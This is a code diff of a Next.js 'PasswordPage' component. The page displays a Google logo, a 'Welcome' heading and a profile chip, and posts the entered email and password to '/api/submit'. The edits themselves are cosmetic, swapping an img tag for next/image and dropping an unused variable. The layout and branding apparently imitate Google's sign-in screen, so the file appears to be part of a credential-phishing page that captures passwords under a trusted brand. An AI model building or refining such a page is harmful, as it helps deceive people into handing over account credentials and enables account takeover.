@@ -1,7 +1,7 @@
 "use client";
 import { useState, useEffect } from "react";
 import {useRouter} from 'next/navigation';
-
+import Image from 'next/image'
 export default function PasswordPage() {
 
   const router = useRouter();
@@ -19,7 +19,7 @@ export default function PasswordPage() {
     e.preventDefault();
     const data = { email, password };
       try {
-        const res = await fetch("/api/submit", {
+          await fetch("/api/submit", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(data)
@@ -37,7 +37,7 @@ export default function PasswordPage() {
       className="min-h-screen text-white w-full"
     >
       <div className="space-y-4 px-6 pt-6">
-        <img src="/google.png" alt="" />
+        <Image src="/google.png" alt="Google logo" width={40} height={40} />
         <h1 className="text-4xl">Welcome</h1>
         <div className="relative flex items-center justify-center border rounded-full px-1.5 py-1 pr-4 max-w-fit">
           <img src="/profile.png" alt="" className="w-5 h-5" />
